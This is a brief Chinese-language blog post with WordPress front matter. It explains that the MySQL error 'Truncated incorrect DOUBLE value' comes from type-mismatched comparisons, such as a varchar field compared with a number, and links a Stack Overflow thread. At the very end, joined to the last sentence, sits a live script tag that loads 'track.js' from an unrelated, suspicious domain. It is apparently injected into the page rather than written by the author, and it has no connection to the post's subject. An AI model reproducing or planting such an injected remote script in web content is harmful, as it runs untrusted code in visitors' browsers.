---
id: 181
title: 'Truncated incorrect DOUBLE value'
date: '2021-08-20T11:09:10+08:00'
author: gavin
layout: post
guid: 'https://gaving.top/?p=181'
permalink: /index.php/2021/08/20/truncated-incorrect-double-value/
blocksy_post_meta_options:
    - 'a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}'
categories:
    - Mysql
---

mysql报错`Truncated incorrect <span class="hljs-keyword">DOUBLE</span> <span class="hljs-keyword">value</span>`

参考 <https://stackoverflow.com/questions/16068993/error-code-1292-truncated-incorrect-double-value-mysql>

主要原因是查询语句包含类型不匹配的对比，例如一个varchar类型字段与数值比较<script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script>